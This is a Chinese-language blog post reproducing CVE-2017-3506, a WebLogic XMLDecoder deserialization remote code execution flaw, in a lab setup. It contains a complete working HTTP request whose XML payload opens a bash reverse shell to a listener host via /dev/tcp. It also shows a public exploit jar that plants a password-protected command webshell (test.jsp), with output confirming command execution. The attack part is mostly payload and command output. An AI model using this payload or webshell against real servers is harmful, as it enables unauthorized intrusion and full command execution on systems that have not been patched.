---
title: xml decode反序列化RCE——CVE-2017-3506
date: 2022-1-10 12:21:30
updated: 2022-1-10 12:21:30
categories: 漏洞复现
tags:
urlname:
keywords: Java反序列化,weblogic
---

### xml decode反序列化RCE——**CVE-2017-3506**

#### 影响版本：

Oracle WebLogic Server10.3.6.0.0 版本

Oracle WebLogic Server12.1.3.0.0 版本

Oracle WebLogic Server12.2.1.1.0 版本

Oracle WebLogic Server12.2.1.2.0 版本

#### 环境搭建：

靶机：CentOS7（192.168.2.101:7001）

监听机器：Windows7（192.168.2.104:1234）

![img](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220108101419.png)



#### 漏洞利用：

##### A.数据包方式

访问URL：`http://ip:7001/wls-wsat/CoordinatorPortType11`

![img](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220110094659.png)

访问这个目录,利用burp抓包,修改请求为post,content-type为text/xml,构造如下xml数据并发送

```
 POST /wls-wsat/CoordinatorPortType HTTP/1.1
 Host: 192.168.2.101:7001
 Accept-Encoding: gzip, deflate
 Accept: */*
 Accept-Language: en
 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
 Connection: close
 Content-Type: text/xml
 Content-Length: 642
 
 
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
 <java version="1.4.0" class="java.beans.XMLDecoder">
 <void class="java.lang.ProcessBuilder">
 <array class="java.lang.String" length="3">
 <void index="0">
 <string>/bin/bash</string>
 </void>
 <void index="1">
 <string>-c</string>
 </void>
 <void index="2">
 <string>bash -i &gt;&amp; /dev/tcp/192.168.2.104/1234 0&gt;&amp;1</string>
 </void>
 </array>
 <void method="start"/></void>
 </java>
 </work:WorkContext>
 </soapenv:Header>
 <soapenv:Body/>
 </soapenv:Envelope>
```

![img](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220110115937.png)

反弹shell成功

![img](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220110120007.png)



##### B.工具利用：

WebLogic Wls-wsat_RCE:

[XHSecurity/Oracle-WebLogic-CVE-2017-10271: Oracle-WebLogic-CVE-2017-10271 (github.com)](https://github.com/XHSecurity/Oracle-WebLogic-CVE-2017-10271)

```
 C:\Users\HUMMER\Desktop\Oracle-WebLogic-CVE-2017-10271-master\Oracle-WebLogic-CV
 E-2017-10271-master>java -jar WebLogic_Wls-Wsat_RCE_Exp.jar http://192.168.2.101
 :7001 test.jsp
 
 [*] Starting exploit...
 [*] Sending payloads...
 [*] Payloads sent...
 [*] Opening shell...
 [*] pwned! Go ahead...
 
 [+] http://192.168.2.101:7001/bea_wls_internal/test.jsp?password=secfree&command
 =whoami
```



test.jsp在目标上是不存在的，我们执行命令的时候会给我们创建一个可以执行命令的脚本，也就是最下面的

```
 http://192.168.2.101:7001/bea_wls_internal/test.jsp?password=secfree&command
 =ls
```

![img](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220110121612.png)

命令执行成功！！